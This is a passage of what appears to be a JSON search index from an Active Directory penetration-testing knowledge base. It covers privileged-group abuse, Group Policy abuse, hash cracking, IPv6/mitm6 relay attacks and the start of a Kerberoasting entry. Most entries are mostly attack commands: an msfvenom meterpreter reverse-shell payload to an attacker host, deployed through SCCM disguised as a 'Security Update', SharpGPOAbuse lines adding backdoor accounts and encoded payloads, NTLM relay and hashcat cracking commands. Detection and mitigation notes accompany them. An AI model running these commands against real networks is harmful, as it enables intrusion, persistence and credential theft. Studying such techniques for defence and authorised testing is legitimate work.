movement.</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#hyper-v-administrators-group-abuse","title":"Hyper-V Administrators Group Abuse","text":"<p>Members of this group have complete control over Hyper-V:</p> <p>Windows: <pre><code># Access the host's disk from a VM\n# Create a configuration file that maps the host's disk to the VM\nSet-VMHardDiskDrive -VMName \"TargetVM\" -ControllerType SCSI -ControllerNumber 0 -Path \"\\\\.\\PhysicalDrive0\"\n\n# Access SAM and SYSTEM files from the host\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#sccm-administrators-group-abuse","title":"SCCM Administrators Group Abuse","text":"<p>SCCM (System Center Configuration Manager) admins can deploy software to any machine in the environment:</p> <ol> <li> <p>Create a malicious application package: <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4444 -f exe &gt; malicious.exe\n</code></pre></p> </li> <li> <p>Push the application to targeted systems using SCCM's infrastructure or PowerShell:</p> </li> </ol> <p>Windows: <pre><code># Using ConfigMgr PowerShell module\nImport-Module ConfigurationManager\nNew-CMApplication -Name \"Security Update\" -Description \"Critical security update\"\n# Continue with application deployment steps\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#exchange-server-group-abuse","title":"Exchange Server Group Abuse","text":"<p>Exchange privileged groups (Organization Management, Exchange Trusted Subsystem) have elevated permissions in AD:</p> <p>Windows: <pre><code># Abuse Exchange Windows Permissions\nAdd-ADGroupMember -Identity \"Exchange Windows Permissions\" -Members \"HackerUser\"\n\n# Use WriteDACL to modify domain permissions\n# Can lead to DCSync capability\n</code></pre></p> <p>Linux: <pre><code># If you have compromised an Exchange account, check for ACL-based attack paths\nbloodhound-python -d domain.local -u exchangeuser -p password -c all -ns 10.10.10.10\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#remote-management-users-group-abuse","title":"Remote Management Users Group Abuse","text":"<p>Members can log in via WinRM/PSRemoting:</p> <p>Windows: <pre><code># Once authenticated via WinRM, look for lateral movement opportunities\nEnter-PSSession -ComputerName \"targetserver.domain.local\" -Credential (Get-Credential)\n\n# Check local privileges and look for misconfigured services\nGet-Service | Where-Object {$_.Status -eq \"Running\"}\n</code></pre></p> <p>Linux: <pre><code># Using evil-winrm\nevil-winrm -i targetserver.domain.local -u remoteuser -p password\n\n# Using CrackMapExec\nnxc winrm targetserver.domain.local -u remoteuser -p password -x \"whoami /all\"\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#certificate-service-dcom-group-abuse","title":"Certificate Service DCOM Group Abuse","text":"<p>Members can enroll for certificates and potentially abuse ESC vulnerabilities:</p> <p>Windows: <pre><code># Enumerate certificate templates\ncertutil -template\n\n# Request certificates using techniques from ADCS vulnerabilities section\n# See ADCS vulnerabilities note for details\n</code></pre></p> <p>Linux: <pre><code># Using Certipy for ADCS exploitation\ncertipy find -u user@domain.local -p password -dc-ip 10.10.10.10\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#schema-admins-group-abuse","title":"Schema Admins Group Abuse","text":"<p>Schema Admins can modify the domain schema, creating backdoors:</p> <p>Windows: <pre><code># Create a backdoor using schemaUpdates\n# This is an advanced technique requiring custom PowerShell/LDAP manipulation\n</code></pre></p> <p>Linux: <pre><code># Using ldapmodify for schema changes\nldapmodify -H ldap://dc.domain.local -D \"cn=schemaadmin,cn=users,dc=domain,dc=local\" -w password -f schema_changes.ldif\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#detection","title":"Detection","text":"<ul> <li>Monitor for changes to privileged group membership</li> <li>Watch for unusual service creation or modification on domain controllers</li> <li>Monitor for DLL loading in sensitive processes like DNS</li> <li>Look for access to critical files like NTDS.dit outside normal backup operations</li> <li>Alert on new scheduled tasks or services on domain controllers</li> <li>Monitor use of administrative tools on unexpected systems</li> </ul>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_membership/#mitigation","title":"Mitigation","text":"<p>General Mitigations: - Apply the principle of least privilege to all group memberships - Regularly audit group memberships, especially for built-in privileged groups - Implement time-based, just-in-time administration for privileged groups - Use Protected Users security group for privileged accounts - Enable Privileged Access Management in Active Directory - Implement tiered administration model</p> <p>Group-Specific Mitigations:</p> <p>DnsAdmins: - Monitor DNS service configurations - Restrict who can restart the DNS service - Consider using AppLocker or similar to restrict DLL loading</p> <p>Server Operators: - Restrict service management capabilities - Use secure service configurations that can't be easily exploited - Implement proper ACLs on service executables</p> <p>Print Operators: - Restrict driver installation capabilities - Monitor for new printer drivers - Consider removing SeLoadDriverPrivilege</p> <p>Backup Operators: - Restrict physical and remote access to domain controllers - Monitor for creation of shadow copies - Audit file access on sensitive locations</p> <p>Account Operators: - Carefully review which groups this group can modify - Implement proper ACLs on sensitive groups - Monitor for new account creation</p> <p>SCCM Admins: - Implement approval workflows for software deployment - Audit SCCM actions regularly - Separate SCCM admin accounts from regular accounts</p> <p>Exchange Groups: - Monitor Exchange server permissions - Regularly audit Exchange-related group memberships - Consider implementing split permissions model</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1078.002","#stage/privilege-escalation","#os/windows","#os/linux","#tool/powerview","#tool/bloodhound","#tool/msfvenom","#tool/impacket"]},{"location":"Active%20Directory/flat/group_policy_abuse/","title":"Group policy abuse","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/group_policy_abuse/#technique","title":"Technique","text":"<p>Group Policy Abuse involves manipulating Group Policy Objects (GPOs) in Active Directory to achieve lateral movement and privilege escalation. When a user or group has modification rights over a GPO that applies to certain computers or users, this access can be leveraged to execute code, add backdoor accounts, modify security settings, or establish persistence.</p> <p>GPOs are used to centrally manage configurations across an AD environment. They can control various settings including security options, user rights assignments, startup/shutdown scripts, software installation, and more. By abusing write access to these objects, an attacker can potentially gain administrative access to systems where the GPO applies.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/group_policy_abuse/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Varies based on the specific attack, but generally requires: - Write permissions on a GPO (CreateChild, WriteProperty, etc.) - Domain user credentials with the ability to modify the target GPO</p> <p>System State: Active Directory environment with Group Policy infrastructure.</p> <p>Information:  - Knowledge of which GPOs you have access to modify - Understanding of where these GPOs are applied (which OUs, computers, users)</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/group_policy_abuse/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Successful abuse of Group Policy can lead to: - Complete compromise of all systems where the GPO applies - Persistent access through various mechanisms (scheduled tasks, startup scripts, etc.) - Privilege escalation to local administrator or even domain administrator - Bypass of security controls and monitoring tools</p> <p>OPSEC</p> <ul> <li>Change Tracking: Many organizations monitor GPO changes. Making modifications to production GPOs will likely be logged.</li> <li>Timing: Group Policy processing occurs at regular intervals (default is 90 minutes with 30-minute randomization) or when manually triggered.</li> <li>Visibility: Changes to GPOs may be visible to administrators through Group Policy Management Console.</li> <li>Event Logs: GPO modification creates specific event IDs that may be monitored (5136, 5137, 5141).</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/group_policy_abuse/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/group_policy_abuse/#identifying-vulnerable-gpos","title":"Identifying Vulnerable GPOs","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/group_policy_abuse/#powerview","title":"PowerView","text":"<p>Find all GPOs: <pre><code>Get-DomainGPO | Select DisplayName, Name, GPCFileSysPath\n</code></pre></p> <p>Check if a specific group has control over any GPOs: <pre><code>$sid = Convert-NameToSid \"Domain Users\"\nGet-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}\n</code></pre></p> <p>Convert GPO GUID to readable name: <pre><code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532\n</code></pre></p> <p>Find which computers a GPO applies to: <pre><code>Get-DomainOU -GPLink \"{GPO-GUID}\" | Select Name\nGet-DomainComputer -SearchBase \"LDAP://OU=Workstations,DC=domain,DC=local\"\n</code></pre></p>","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/group_policy_abuse/#bloodhound","title":"BloodHound","text":"<p>Query for GPOs you can modify: <pre><code>MATCH p=(u:User)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|WriteProperty*1..]-&gt;(g:GPO) RETURN p\n</code></pre></p> <p>Examine GPO details in the \"Node Info\" tab to see affected objects.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/group_policy_abuse/#group3r","title":"Group3r","text":"<p>Analyze GPO security settings: <pre><code>group3r.exe -f output.log\n</code></pre></p> <p>Scan a domain for GPO weaknesses: <pre><code>group3r.exe -d domain.local -u username -p password\n</code></pre></p>","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/group_policy_abuse/#exploiting-gpo-access","title":"Exploiting GPO Access","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/group_policy_abuse/#sharpgpoabuse","title":"SharpGPOAbuse","text":"<p>Add a local admin: <pre><code>SharpGPOAbuse.exe --AddLocalAdmin --UserAccount DOMAIN\\eviluser --GPOName \"Vulnerable GPO\"\n</code></pre></p> <p>Create an immediate scheduled task: <pre><code>SharpGPOAbuse.exe --AddComputerTask --TaskName \"Backdoor\" --Author DOMAIN\\Administrator --Command \"cmd.exe\" --Arguments \"/c net user backdoor Password123! /add\" --GPOName \"Vulnerable GPO\"\n</code></pre></p> <p>Configure a user or computer startup script: <pre><code>SharpGPOAbuse.exe --AddUserScript --ScriptName startup.bat --ScriptContents \"powershell -enc BASE64_ENCODED_PAYLOAD\" --GPOName \"Vulnerable GPO\"\n</code></pre></p>","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/group_policy_abuse/#manual-gpo-modification","title":"Manual GPO Modification","text":"<ol> <li> <p>Map the SYSVOL share: <pre><code>net use Z: \\\\domain.local\\SYSVOL\n</code></pre></p> </li> <li> <p>Navigate to the GPO location: <pre><code>cd Z:\\domain.local\\Policies\\{GPO-GUID}\n</code></pre></p> </li> <li> <p>Modify scripts, add registry settings, etc.</p> </li> <li> <p>Force GPO update on a target: <pre><code>Invoke-GPUpdate -Computer \"target-computer\" -Force\n</code></pre></p> </li> </ol>","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/group_policy_abuse/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li>Revert all changes made to GPOs after use</li> <li>Remove any added users or scheduled tasks</li> <li>Delete any dropped files or scripts</li> <li>Use Group Policy versioning to your advantage (previous versions may be available)</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/group_policy_abuse/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/group_policy_abuse/#detection","title":"Detection","text":"<ul> <li>Monitor for GPO modification events (Event IDs 5136, 5137, 5141)</li> <li>Track changes to GPOs using Group Policy auditing</li> <li>Implement regular GPO reviews and compliance checks</li> <li>Monitor for unusual scripts or settings in GPOs</li> <li>Watch for changes to administrative group memberships through GPOs</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/group_policy_abuse/#mitigation","title":"Mitigation","text":"<ul> <li>Implement least privilege for GPO management</li> <li>Use delegated permissions carefully; avoid giving GPO modification rights to regular users</li> <li>Regularly audit GPO permissions using tools like Group3r and BloodHound</li> <li>Use AGPM (Advanced Group Policy Management) for change control and approval processes</li> <li>Implement Protected Groups and AdminSDHolder protection</li> <li>Segment administrative functions and create separate OUs with specific GPOs</li> <li>Consider using WMI filtering to limit GPO scope</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1484","#stage/lateral-movement","#stage/privilege-escalation","#os/windows","#tool/sharppgoabuse","#tool/group3r","#tool/powerview","#tool/bloodhound"]},{"location":"Active%20Directory/flat/hash_cracking/","title":"Hash cracking","text":"","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/hash_cracking/#technique","title":"Technique","text":"<p>Hash cracking is the process of attempting to recover plaintext passwords from their hashed values. This technique is used when an attacker has obtained password hashes through various means such as credential dumping, NTLM capture, or Kerberos attacks.</p> <p>By successfully cracking hashes, an attacker can obtain the actual passwords for user accounts, allowing for direct authentication to systems and services rather than relying on pass-the-hash or similar techniques.</p>","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/hash_cracking/#common-hash-types-in-active-directory-environments","title":"Common Hash Types in Active Directory Environments","text":"","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/hash_cracking/#ntlm-hashes","title":"NTLM Hashes","text":"<p>NTLM hashes are stored in the SAM database or NTDS.dit and represent local or domain user passwords. These are the most common targets in Windows environments.</p> <p>Cracking with Hashcat: <pre><code>hashcat -m 1000 --force -a 0 hashes.txt /path/to/wordlist\n</code></pre></p> <p>Cracking with John the Ripper: <pre><code>john --format=NT hashes.txt --wordlist=/path/to/wordlist\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/hash_cracking/#netntlmv2-hashes","title":"NetNTLMv2 Hashes","text":"<p>NetNTLMv2 hashes are captured from network authentication traffic, typically through tools like Responder, Inveigh, or NTLM relay attacks.</p> <p>Cracking with Hashcat: <pre><code>hashcat -m 5600 --force -a 0 hashes.txt /path/to/wordlist\n</code></pre></p> <p>Cracking with John the Ripper: <pre><code>john --format=netntlmv2 hashes.txt --wordlist=/path/to/wordlist\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/hash_cracking/#as-rep-roasting-hashes-kerberos-5-as-rep-etype-23","title":"AS-REP Roasting Hashes (Kerberos 5 AS-REP etype 23)","text":"<p>These hashes are obtained when requesting authentication data for accounts with Kerberos pre-authentication disabled.</p> <p>Cracking with Hashcat: <pre><code>hashcat -m 18200 --force -a 0 hashes.txt /path/to/wordlist\n</code></pre></p> <p>Cracking with John the Ripper: <pre><code>john --format=krb5asrep hashes.txt --wordlist=/path/to/wordlist\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/hash_cracking/#kerberoasting-hashes-kerberos-5-tgs-rep","title":"Kerberoasting Hashes (Kerberos 5 TGS-REP)","text":"<p>These hashes are obtained through Kerberoasting, where service account ticket encryption can be subjected to offline cracking.</p> <p>Cracking with Hashcat: <pre><code>hashcat -m 13100 --force -a 0 hashes.txt /path/to/wordlist\n</code></pre></p> <p>Cracking with John the Ripper: <pre><code>john --format=krb5tgs hashes.txt --wordlist=/path/to/wordlist\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/hash_cracking/#advanced-cracking-techniques","title":"Advanced Cracking Techniques","text":"","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/hash_cracking/#rule-based-attacks","title":"Rule-Based Attacks","text":"<p>Rule-based attacks apply transformation rules to wordlist entries to generate variations:</p> <pre><code>hashcat -m 1000 -r rules/best64.rule hashes.txt /path/to/wordlist\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/hash_cracking/#mask-attacks-pattern-based","title":"Mask Attacks (Pattern-Based)","text":"<p>Mask attacks define specific patterns to try:</p> <pre><code># Crack an 8-character password with uppercase, lowercase, and digits\nhashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?d\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/hash_cracking/#hybrid-attacks","title":"Hybrid Attacks","text":"<p>Combines wordlists with masks:</p> <pre><code># Append 4 digits to each word in the wordlist\nhashcat -m 1000 -a 6 hashes.txt /path/to/wordlist ?d?d?d?d\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/hash_cracking/#dictionary-combination-attacks","title":"Dictionary Combination Attacks","text":"<p>Combines words from dictionaries:</p> <pre><code>hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/hash_cracking/#optimizing-cracking-efficiency","title":"Optimizing Cracking Efficiency","text":"<ol> <li> <p>Use appropriate hardware: GPUs significantly outperform CPUs for hash cracking.</p> </li> <li> <p>Choose targeted wordlists: Use context-specific dictionaries (company names, industry terms, etc.).</p> </li> <li> <p>Start with fast attacks first:</p> </li> <li>Basic wordlists</li> <li>Common rule sets (best64.rule)</li> <li>Short mask attacks</li> <li> <p>Then progress to more comprehensive approaches</p> </li> <li> <p>Customize rules for your target: Create custom rules based on the organization's password policy.</p> </li> <li> <p>Utilize hash sorting: Group similar hash types together for more efficient cracking.</p> </li> </ol>","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/hash_cracking/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/hash_cracking/#detection","title":"Detection","text":"<ul> <li>This is primarily an offline attack, making it difficult to detect</li> <li>Monitor for mass hash extraction events</li> <li>Look for suspicious access to authentication databases</li> <li>Watch for unusual traffic patterns that could indicate hash harvesting</li> </ul>","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/hash_cracking/#mitigation","title":"Mitigation","text":"<ul> <li>Implement strong password policies (length, complexity, regular changes)</li> <li>Use password filters to prevent common or easily cracked passwords</li> <li>Enable multi-factor authentication where possible</li> <li>Consider implementing credential guard to protect authentication material</li> <li>Audit authentication logs regularly to detect potential compromise</li> <li>Use the Protected Users security group for privileged accounts</li> <li>Regularly run password audits to identify weak passwords before attackers do</li> </ul>","tags":["#type/technique","#tactic/TA0006","#stage/credential-access","#stage/lateral-movement","#stage/privilege-escalation","#tool/hashcat","#tool/john","#os/windows","#protocol/ntlm","#protocol/kerberos"]},{"location":"Active%20Directory/flat/ipv6_attacks/","title":"Ipv6 attacks","text":"","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/ipv6","#tool/mitm6","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/ipv6_attacks/#technique","title":"Technique","text":"<p>IPv6 attacks exploit Windows' preference for IPv6 over IPv4 and common IPv6 misconfigurations in enterprise networks. Attackers can intercept and manipulate network traffic, leading to credential theft and domain compromise.</p>","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/ipv6","#tool/mitm6","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/ipv6_attacks/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Network access to the target network.</p> <p>System State: IPv6 must be enabled (default in Windows).</p> <p>Information: Ability to send router advertisements and respond to neighbor solicitations.</p>","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/ipv6","#tool/mitm6","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/ipv6_attacks/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/ipv6","#tool/mitm6","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/ipv6_attacks/#mitm6-dns-takeover","title":"mitm6 DNS Takeover","text":"<pre><code># Basic usage\nmitm6 -d example.com -i eth0\n\n# With WPAD attack\nmitm6 -d example.com -i eth0 --wpad\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/ipv6","#tool/mitm6","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/ipv6_attacks/#ntlm-relay-with-mitm6","title":"NTLM Relay with mitm6","text":"<pre><code># Start mitm6 in one terminal\nmitm6 -d example.com -i eth0\n\n# In another terminal, start ntlmrelayx\nntlmrelayx.py -6 -t ldaps://DOMAIN_CONTROLLER -wh attacker-ip -l loot/\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/ipv6","#tool/mitm6","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/ipv6_attacks/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/ipv6","#tool/mitm6","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/ipv6_attacks/#detection","title":"Detection","text":"<ul> <li>Monitor for unexpected IPv6 traffic</li> <li>Look for rogue router advertisements</li> <li>Watch for unexpected DNS queries/responses</li> </ul>","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/ipv6","#tool/mitm6","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/ipv6_attacks/#mitigation","title":"Mitigation","text":"<ul> <li>Disable IPv6 if not needed</li> <li>Implement RA Guard on network devices</li> <li>Configure DHCPv6 Guard</li> <li>Disable LLMNR and NetBIOS-NS</li> <li>Enable SMB Signing</li> </ul>","tags":["#type/technique","#tactic/TA0001","#stage/initial-access","#os/windows","#protocol/ipv6","#tool/mitm6","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/kerberoasting/","title":"Kerberoasting","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberoasting/#technique","title":"Technique","text":"<p>Kerberoasting is a post-exploitation attack technique that targets Microsoft Active Directory. An attacker with credentials for any valid domain account (even a low-privilege one) can request Kerberos service tickets for accounts that have a Service Principal Name (SPN) configured.</p> <p>A portion of the returned ticket-granting service (TGS) ticket is encrypted with the NTLM hash of the service account's password. The attacker captures this ticket and takes it offline to crack the password using brute-force methods. Since the cracking happens offline, it does not generate failed login events on the network, making it a stealthy way to escalate privileges by compromising potentially high-value service accounts.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberoasting/#prerequisites","title":"Prerequisites","text":"<p>Access Level: A valid Active Directory domain account. No special or elevated privileges are required.</p> <p>System State: The attacker must have network access to a Domain Controller to request tickets.</p> <p>Information: The attacker needs to identify user accounts (not computer accounts) that have an SPN configured.</p> <p>Misc: Your system time must be synced with the DC</p> <p>Linux:</p> <pre><code>sudo timedatectl set-ntp off\nsudo rdate -n &lt;targetDC&gt;\n</code></pre> <p>Windows:</p> <pre><code>NET TIME /DOMAIN\nNET TIME \\\\&lt;MACHINENAME&gt; /SET /Y\nNET TIME \\\\&lt;IP Address&gt; /SET /Y\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/flat/kerberoasting/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Successful cracking of a service account password can lead to significant privilege escalation and lateral movement. Service accounts are often misconfigured with excessive permissions (including Domain Admin) to ensure applications work, making them high-value targets.</p> <p>OPSEC</p> <ul> <li> <p>Noise: Requesting service tickets for many SPNs in a short period can trigger alerts. A single user requesting dozens or hundreds of TGS tickets (Event ID 4769) is highly anomalous.</p> </li> <li> 